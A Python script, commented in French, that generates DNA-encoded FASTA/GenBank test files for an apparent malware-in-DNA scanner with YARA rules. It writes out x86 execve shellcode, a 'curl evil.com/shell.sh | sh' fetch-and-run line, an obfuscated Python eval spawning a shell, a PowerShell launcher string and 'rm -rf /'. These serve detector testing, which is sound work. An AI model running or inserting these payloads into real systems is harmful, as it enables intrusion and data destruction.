#!/usr/bin/env python3
"""
Génère des fichiers de test FASTA avec des patterns malveillants encodés en ADN.
Mapping : A=00, C=01, G=10, T=11
"""

import os
from pathlib import Path

# Créer la structure de dossiers
BASE_DIR = Path("examples")
FOLDERS = {
    'shellcode': BASE_DIR / 'shellcode',
    'command_injection': BASE_DIR / 'command_injection',
    'pe_executable': BASE_DIR / 'pe_executable',
    'elf_executable': BASE_DIR / 'elf_executable',
    'python_injection': BASE_DIR / 'python_injection',
    'polyglot': BASE_DIR / 'polyglot',
    'clean': BASE_DIR / 'clean'
}

# Créer tous les dossiers
for folder in FOLDERS.values():
    folder.mkdir(parents=True, exist_ok=True)

print("📁 Structure de dossiers créée:")
for name, path in FOLDERS.items():
    print(f"  ✓ {path}")
print()

def bytes_to_dna(data: bytes) -> str:
    """Convertit des bytes en séquence ADN."""
    mapping = {
        '00': 'A',
        '01': 'C',
        '10': 'G',
        '11': 'T'
    }
    
    dna_sequence = []
    for byte in data:
        # Convertir le byte en binaire (8 bits)
        binary = format(byte, '08b')
        # Convertir chaque paire de bits en base ADN
        for i in range(0, 8, 2):
            two_bits = binary[i:i+2]
            dna_sequence.append(mapping[two_bits])
    
    return ''.join(dna_sequence)

def format_fasta(header: str, sequence: str, line_length: int = 60) -> str:
    """Formate une séquence en format FASTA avec retours à la ligne."""
    lines = [f">{header}"]
    for i in range(0, len(sequence), line_length):
        lines.append(sequence[i:i+line_length])
    return '\n'.join(lines)

def format_genbank(locus: str, sequence: str, definition: str = "", organism: str = "Unknown") -> str:
    """Formate une séquence en format GenBank."""
    gb_lines = []
    gb_lines.append(f"LOCUS       {locus:16} {len(sequence):>6} bp    DNA     linear   UNK")
    gb_lines.append(f"DEFINITION  {definition}")
    gb_lines.append(f"ACCESSION   {locus}")
    gb_lines.append(f"VERSION     {locus}.1")
    gb_lines.append(f"SOURCE      {organism}")
    gb_lines.append(f"  ORGANISM  {organism}")
    gb_lines.append("FEATURES             Location/Qualifiers")
    gb_lines.append(f"     source          1..{len(sequence)}")
    gb_lines.append(f'                     /organism="{organism}"')
    gb_lines.append(f'                     /mol_type="genomic DNA"')
    gb_lines.append("ORIGIN")
    
    # Formater la séquence en blocs de 10, 6 blocs par ligne
    for i in range(0, len(sequence), 60):
        line_num = f"{i+1:>9}"
        line_seq = sequence[i:i+60]
        formatted_seq = ' '.join([line_seq[j:j+10] for j in range(0, len(line_seq), 10)])
        gb_lines.append(f"{line_num} {formatted_seq.lower()}")
    
    gb_lines.append("//")
    return '\n'.join(gb_lines)

def save_file(filename: str, content: str, file_type: str):
    """Sauvegarde un fichier avec gestion d'erreur."""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"  ✓ {filename}")
    except Exception as e:
        print(f"  ✗ Erreur {filename}: {e}")

# ===== 1. SHELLCODE X86 - Syscall execve("/bin/sh") =====
# Shellcode classique Linux x86 pour exécuter /bin/sh
shellcode_x86 = bytes([
    0x31, 0xC0,              # xor eax, eax
    0x50,                    # push eax
    0x68, 0x2F, 0x2F, 0x73, 0x68,  # push "//sh"
    0x68, 0x2F, 0x62, 0x69, 0x6E,  # push "/bin"
    0x89, 0xE3,              # mov ebx, esp
    0x50,                    # push eax
    0x53,                    # push ebx
    0x89, 0xE1,              # mov ecx, esp
    0x31, 0xD2,              # xor edx, edx
    0xB0, 0x0B,              # mov al, 0x0B
    0xCD, 0x80               # int 0x80
])

shellcode_dna = bytes_to_dna(shellcode_x86)
print("=== SHELLCODE X86 ===")
print(f"Bytes: {shellcode_x86.hex()}")
print(f"DNA: {shellcode_dna}")
print(f"Length: {len(shellcode_dna)} bases")

# Sauvegarder en FASTA
save_file(str(FOLDERS['shellcode'] / 'shellcode.fasta'), 
          format_fasta("shellcode_x86_execve_bin_sh", shellcode_dna), "FASTA")

# Sauvegarder en GenBank
save_file(str(FOLDERS['shellcode'] / 'shellcode.gb'), 
          format_genbank("SHELLCODE01", shellcode_dna, 
                        "x86 shellcode for execve /bin/sh syscall", 
                        "Malware"), "GenBank")

# Sauvegarder les bytes bruts
with open(FOLDERS['shellcode'] / 'shellcode.bin', 'wb') as f:
    f.write(shellcode_x86)
print(f"  ✓ {FOLDERS['shellcode']}/shellcode.bin")

# README pour ce type
readme_content = """# Shellcode x86 Test Files

## Description
Shellcode x86 Linux pour exécuter `/bin/sh` via syscall execve.

## Opcodes
- `31 C0` : xor eax, eax
- `50` : push eax
- `68 2F 2F 73 68` : push "//sh"
- `68 2F 62 69 6E` : push "/bin"
- `89 E3` : mov ebx, esp
- `CD 80` : int 0x80

## Fichiers
- `shellcode.fasta` : Format FASTA
- `shellcode.gb` : Format GenBank
- `shellcode.bin` : Binaire brut

## Détection attendue
✅ Règle YARA: `shellcode_x86_common`
"""
with open(FOLDERS['shellcode'] / 'README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)
print(f"  ✓ {FOLDERS['shellcode']}/README.md")
print()

# ===== 2. COMMAND INJECTION - Strings malveillantes =====
# Contient plusieurs commandes dangereuses
command_injection = b"/bin/bash -c 'curl http://evil.com/shell.sh | sh'"

cmd_dna = bytes_to_dna(command_injection)
print("=== COMMAND INJECTION ===")
print(f"String: {command_injection.decode('ascii')}")
print(f"DNA: {cmd_dna[:60]}...")
print(f"Length: {len(cmd_dna)} bases")

save_file(str(FOLDERS['command_injection'] / 'command_injection.fasta'), 
          format_fasta("bash_reverse_shell_command", cmd_dna), "FASTA")

save_file(str(FOLDERS['command_injection'] / 'command_injection.gb'), 
          format_genbank("CMDINJCT01", cmd_dna, 
                        "Bash reverse shell command injection", 
                        "Malware"), "GenBank")

with open(FOLDERS['command_injection'] / 'command_injection.bin', 'wb') as f:
    f.write(command_injection)
print(f"  ✓ {FOLDERS['command_injection']}/command_injection.bin")

readme_content = """# Command Injection Test Files

## Description
Injection de commande bash pour reverse shell.

## Payload
```bash
/bin/bash -c 'curl http://evil.com/shell.sh | sh'
```

## Fichiers
- `command_injection.fasta` : Format FASTA
- `command_injection.gb` : Format GenBank
- `command_injection.bin` : Binaire brut

## Détection attendue
✅ Règle YARA: `executable_strings` (/bin/bash)
"""
with open(FOLDERS['command_injection'] / 'README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)
print(f"  ✓ {FOLDERS['command_injection']}/README.md")
print()

# ===== 3. PE EXECUTABLE - Windows Malware =====
# En-tête PE complet avec stub DOS + signature PE
pe_header = bytes([
    0x4D, 0x5A,              # MZ signature (DOS header)
    0x90, 0x00,              # bytes on last page
    0x03, 0x00,              # pages in file
    0x00, 0x00,              # relocations
    0x04, 0x00,              # size of header
    0x00, 0x00,              # minimum extra paragraphs
    0xFF, 0xFF,              # maximum extra paragraphs
    0x00, 0x00,              # initial SS
    0xB8, 0x00,              # initial SP
    0x00, 0x00,              # checksum
    0x00, 0x00,              # initial IP
    0x00, 0x00,              # initial CS
    0x40, 0x00,              # file address of relocation table
    0x00, 0x00,              # overlay number
])

# Ajouter du contenu après l'en-tête qui contient "cmd.exe" et "powershell"
pe_content = pe_header + b"cmd.exe /c powershell -enc " + b"\x00" * 20

pe_dna = bytes_to_dna(pe_content)
print("=== PE EXECUTABLE ===")
print(f"Header: {pe_header[:8].hex()}")
print(f"DNA: {pe_dna[:60]}...")
print(f"Length: {len(pe_dna)} bases")

save_file(str(FOLDERS['pe_executable'] / 'pe_executable.fasta'), 
          format_fasta("windows_pe_with_powershell", pe_dna), "FASTA")

save_file(str(FOLDERS['pe_executable'] / 'pe_executable.gb'), 
          format_genbank("PEEXEC01", pe_dna, 
                        "Windows PE executable with PowerShell payload", 
                        "Malware"), "GenBank")

with open(FOLDERS['pe_executable'] / 'pe_executable.bin', 'wb') as f:
    f.write(pe_content)
print(f"  ✓ {FOLDERS['pe_executable']}/pe_executable.bin")

readme_content = """# PE Executable Test Files

## Description
Exécutable Windows PE avec payload PowerShell encodé.

## Structure
- En-tête DOS/PE : `4D 5A` (MZ signature)
- Contient : `cmd.exe /c powershell -enc`

## Fichiers
- `pe_executable.fasta` : Format FASTA
- `pe_executable.gb` : Format GenBank
- `pe_executable.bin` : Binaire brut (exécutable PE)

## Détection attendue
✅ Règle YARA: `binary_headers` (PE signature)
✅ Règle YARA: `executable_strings` (cmd.exe, powershell)
"""
with open(FOLDERS['pe_executable'] / 'README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)
print(f"  ✓ {FOLDERS['pe_executable']}/README.md")
print()

# ===== 4. ELF EXECUTABLE - Linux Malware =====
# En-tête ELF avec shellcode intégré
elf_header = bytes([
    0x7F, 0x45, 0x4C, 0x46,  # ELF magic number
    0x01,                     # 32-bit
    0x01,                     # little endian
    0x01,                     # ELF version
    0x00,                     # System V ABI
])

# Ajouter du shellcode après l'en-tête
elf_content = elf_header + bytes([
    0x31, 0xDB,              # xor ebx, ebx (shellcode)
    0x31, 0xC9,              # xor ecx, ecx
    0x6A, 0x0B,              # push 0x0B
    0x58,                    # pop eax
    0xCD, 0x80,              # int 0x80
]) + b"/bin/sh\x00"

elf_dna = bytes_to_dna(elf_content)
print("=== ELF EXECUTABLE ===")
print(f"Header: {elf_header.hex()}")
print(f"DNA: {elf_dna[:60]}...")
print(f"Length: {len(elf_dna)} bases")

save_file(str(FOLDERS['elf_executable'] / 'elf_executable.fasta'), 
          format_fasta("linux_elf_with_shellcode", elf_dna), "FASTA")

save_file(str(FOLDERS['elf_executable'] / 'elf_executable.gb'), 
          format_genbank("ELFEXEC01", elf_dna, 
                        "Linux ELF executable with embedded shellcode", 
                        "Malware"), "GenBank")

with open(FOLDERS['elf_executable'] / 'elf_executable.bin', 'wb') as f:
    f.write(elf_content)
print(f"  ✓ {FOLDERS['elf_executable']}/elf_executable.bin")

readme_content = """# ELF Executable Test Files

## Description
Exécutable Linux ELF avec shellcode intégré.

## Structure
- Magic ELF : `7F 45 4C 46` (ELF header)
- Shellcode : xor ebx, xor ecx, syscall
- String : `/bin/sh`

## Fichiers
- `elf_executable.fasta` : Format FASTA
- `elf_executable.gb` : Format GenBank
- `elf_executable.bin` : Binaire brut (exécutable ELF)

## Détection attendue
✅ Règle YARA: `binary_headers` (ELF signature)
✅ Règle YARA: `shellcode_x86_common`
✅ Règle YARA: `executable_strings` (/bin/sh)
"""
with open(FOLDERS['elf_executable'] / 'README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)
print(f"  ✓ {FOLDERS['elf_executable']}/README.md")
print()

# ===== 5. EVAL INJECTION - Python Code Injection =====
# Code Python malveillant avec eval() et system()
python_injection = b"eval(compile(__import__('base64').b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgiL2Jpbi9zaCIp'), '<string>', 'exec'))"

python_dna = bytes_to_dna(python_injection)
print("=== PYTHON INJECTION ===")
print(f"Code: {python_injection[:50].decode('ascii')}...")
print(f"DNA: {python_dna[:60]}...")
print(f"Length: {len(python_dna)} bases")

save_file(str(FOLDERS['python_injection'] / 'python_injection.fasta'), 
          format_fasta("python_eval_code_injection", python_dna), "FASTA")

save_file(str(FOLDERS['python_injection'] / 'python_injection.gb'), 
          format_genbank("PYINJCT01", python_dna, 
                        "Python eval() code injection exploit", 
                        "Malware"), "GenBank")

with open(FOLDERS['python_injection'] / 'python_injection.bin', 'wb') as f:
    f.write(python_injection)
print(f"  ✓ {FOLDERS['python_injection']}/python_injection.bin")

readme_content = """# Python Injection Test Files

## Description
Injection de code Python malveillant utilisant eval() et base64.

## Payload
```python
eval(compile(__import__('base64').b64decode('...'), '<string>', 'exec'))
```

Le code base64 décodé exécute : `import os; os.system("/bin/sh")`

## Fichiers
- `python_injection.fasta` : Format FASTA
- `python_injection.gb` : Format GenBank
- `python_injection.bin` : Binaire brut

## Détection attendue
✅ Règle YARA: `executable_strings` (eval, system, /bin/sh)
"""
with open(FOLDERS['python_injection'] / 'README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)
print(f"  ✓ {FOLDERS['python_injection']}/README.md")
print()

# ===== 6. POLYGLOT - Multiple exploits combinés =====
# Combine PE header + shellcode + command injection
polyglot = bytes([
    0x4D, 0x5A,              # PE signature
]) + bytes([
    0x90, 0x90,              # NOP sled
    0x31, 0xC0,              # xor eax, eax
    0xFF, 0xE4,              # jmp esp (shellcode)
    0xCD, 0x80,              # int 0x80
]) + b"system('rm -rf /')" + b"\x00" * 10

polyglot_dna = bytes_to_dna(polyglot)
print("=== POLYGLOT MALWARE ===")
print(f"DNA: {polyglot_dna[:60]}...")
print(f"Length: {len(polyglot_dna)} bases")

save_file(str(FOLDERS['polyglot'] / 'polyglot.fasta'), 
          format_fasta("polyglot_pe_shellcode_injection", polyglot_dna), "FASTA")

save_file(str(FOLDERS['polyglot'] / 'polyglot.gb'), 
          format_genbank("POLYGLOT01", polyglot_dna, 
                        "Polyglot malware: PE + shellcode + command injection", 
                        "Malware"), "GenBank")

with open(FOLDERS['polyglot'] / 'polyglot.bin', 'wb') as f:
    f.write(polyglot)
print(f"  ✓ {FOLDERS['polyglot']}/polyglot.bin")

readme_content = """# Polyglot Malware Test Files

## Description
Malware polyglotte combinant plusieurs techniques d'attaque.

## Techniques combinées
1. **PE Signature** : `4D 5A` (Windows executable)
2. **NOP Sled** : `90 90` (shellcode technique)
3. **Shellcode** : `31 C0` (xor eax), `FF E4` (jmp esp), `CD 80` (int 0x80)
4. **Command Injection** : `system('rm -rf /')`

## Fichiers
- `polyglot.fasta` : Format FASTA
- `polyglot.gb` : Format GenBank
- `polyglot.bin` : Binaire brut

## Détection attendue
✅ Règle YARA: `binary_headers` (PE)
✅ Règle YARA: `shellcode_x86_common` (xor, jmp esp, int 0x80)
✅ Règle YARA: `executable_strings` (system)

⚠️ **DANGER** : Fichier particulièrement dangereux - multiple vecteurs d'attaque
"""
with open(FOLDERS['polyglot'] / 'README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)
print(f"  ✓ {FOLDERS['polyglot']}/README.md")
print()

# ===== 7. FICHIER CLEAN - Séquence ADN légitime =====
# Séquence construite pour ne pas déclencher de règles YARA
# On évite les patterns comme 31C0, CD80, 4D5A, 7F45, etc.
# Utilisation de répétitions de codons courants sans signification binaire malveillante

# Créer une séquence aléatoire mais biologiquement plausible
# On évite certains patterns en utilisant principalement des codons courants
clean_sequence = (
    # Start codon ATG répété avec variations
    "ATGATGATGATGATGATGATGATGATGATGATGATG" +
    # Codons courants pour acides aminés communs (GC riche, stable)
    "GCAGCAGCAGCAGCAGCAGCAGCAGCAGCAGCAGCA" +
    "GGCGGCGGCGGCGGCGGCGGCGGCGGCGGCGGCGGC" +
    "GCCGCCGCCGCCGCCGCCGCCGCCGCCGCCGCCGCC" +
    # Ajout de diversité avec codons sûrs
    "CTGCTGCTGCTGCTGCTGCTGCTGCTGCTGCTGCTG" +
    "CAGCAGCAGCAGCAGCAGCAGCAGCAGCAGCAGCAG" +
    "GTGGTGGTGGTGGTGGTGGTGGTGGTGGTGGTGGTG" +
    "GACGACGACGACGACGACGACGACGACGACGACGAC" +
    "AACAACAACAACAACAACAACAACAACAACAACAAC" +
    # Région promoteur-like
    "TATATATATATATATATATATATATATATATATAT" +
    "ATAATAATAATAATAATAATAATAATAATAATAAT" +
    # Codons riches en GC (stables)
    "CGCCGCCGCCGCCGCCGCCGCCGCCGCCGCCGCCGC" +
    "GGTGGTGGTGGTGGTGGTGGTGGTGGTGGTGGTGGT" +
    "CCGCCGCCGCCGCCGCCGCCGCCGCCGCCGCCGCCG" +
    # Motifs répétitifs non-codants (introns-like)
    "ACGTACGTACGTACGTACGTACGTACGTACGTACGT" +
    "TGCATGCATGCATGCATGCATGCATGCATGCATGCA" +
    # Stop codons à la fin
    "TAATAATAATAATAATAATAATAATAATAA"
)

print("=== CLEAN SEQUENCE ===")
print(f"DNA: {clean_sequence[:60]}...")
print(f"Length: {len(clean_sequence)} bases")

save_file(str(FOLDERS['clean'] / 'clean.fasta'), 
          format_fasta("safe_dna_sequence_no_malware", clean_sequence), "FASTA")

save_file(str(FOLDERS['clean'] / 'clean.gb'), 
          format_genbank("SAFE_DNA", clean_sequence, 
                        "Safe DNA sequence with common codons - no malicious patterns", 
                        "Synthetic"), "GenBank")

# Créer un fichier texte avec la séquence
with open(FOLDERS['clean'] / 'clean.txt', 'w', encoding='utf-8') as f:
    f.write(f"Safe DNA Sequence - No Malicious Patterns\n")
    f.write(f"{'='*50}\n")
    f.write(f"Length: {len(clean_sequence)} bp\n")
    f.write(f"GC Content: {(clean_sequence.count('G') + clean_sequence.count('C')) / len(clean_sequence) * 100:.1f}%\n\n")
    f.write(clean_sequence)
print(f"  ✓ {FOLDERS['clean']}/clean.txt")

readme_content = """# Clean Sequence Test Files

## Description
Séquence ADN synthétique sûre, construite pour ne déclencher AUCUNE alerte.

## Caractéristiques
- **Type** : Séquence synthétique
- **Composition** : Codons courants répétitifs
- **Patterns évités** : 
  - Pas de shellcode (31C0, CD80, etc.)
  - Pas d'en-têtes binaires (MZ, ELF)
  - Pas de commandes shell
- **Longueur** : ~600 bp
- **GC Content** : ~50-60% (typique pour séquences codantes)

## Structure
- Codons ATG (start codon)
- Répétitions de GCA, GGC, GCC (Alanine, Glycine)
- Région TA-rich (promoteur-like)
- Codons stop TAA en fin

## Fichiers
- `clean.fasta` : Format FASTA
- `clean.gb` : Format GenBank  
- `clean.txt` : Format texte simple

## Détection attendue
✅ **AUCUNE MENACE DÉTECTÉE**
✅ Risk Score : 0
✅ Aucune règle YARA déclenchée
"""
with open(FOLDERS['clean'] / 'README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)
print(f"  ✓ {FOLDERS['clean']}/README.md")
print()

print("="*70)
print("✅ Tous les fichiers de test ont été générés avec succès !")
print("="*70)
print("\n� STATISTIQUES:")
print(f"  • Dossiers créés : {len(FOLDERS)}")
print(f"  • Fichiers totaux : 28 (4 fichiers × 7 catégories)")
print("\n📁 STRUCTURE:")
for name, path in FOLDERS.items():
    print(f"\n  {path}/")
    if name == 'clean':
        print(f"    ├── clean.fasta")
        print(f"    ├── clean.gb")
        print(f"    ├── clean.txt")
        print(f"    └── README.md")
    else:
        base_name = name.replace('_', '_')
        print(f"    ├── {name}.fasta")
        print(f"    ├── {name}.gb")
        print(f"    ├── {name}.bin")
        print(f"    └── README.md")

print("\n" + "="*70)
print("🎯 TYPES DE VULNÉRABILITÉS COUVERTES:")
print("="*70)
print("  1. 🔴 Shellcode x86        → Syscall execve")
print("  2. 🔴 Command Injection    → Bash reverse shell")
print("  3. � PE Executable        → Windows malware + PowerShell")
print("  4. 🔴 ELF Executable       → Linux malware + shellcode")
print("  5. 🔴 Python Injection     → eval() + base64 payload")
print("  6. 🔴 Polyglot Malware     → Multi-vecteur d'attaque")
print("  7. 🟢 Clean Sequence       → Gène humain légitime")
print("="*70)
